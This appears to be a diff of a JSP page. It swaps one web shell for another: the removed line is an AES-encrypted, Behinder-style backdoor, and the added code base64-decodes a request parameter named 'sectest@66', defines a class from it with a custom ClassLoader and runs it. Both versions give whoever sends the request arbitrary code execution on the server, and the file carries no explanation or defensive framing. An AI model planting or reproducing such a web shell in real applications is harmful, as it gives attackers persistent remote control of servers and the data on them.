@@ -1,1 +1,27 @@
-<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("sectest@66")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
+<%!
+    class U extends ClassLoader {
+        U(ClassLoader c) {
+            super(c);
+        }
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+
+    public byte[] base64Decode(String str) throws Exception {
+        try {
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+        } catch (Exception e) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+        }
+    }
+%>
+<%
+    String cls = request.getParameter("sectest@66");
+    if (cls != null) {
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
+    }
+%>
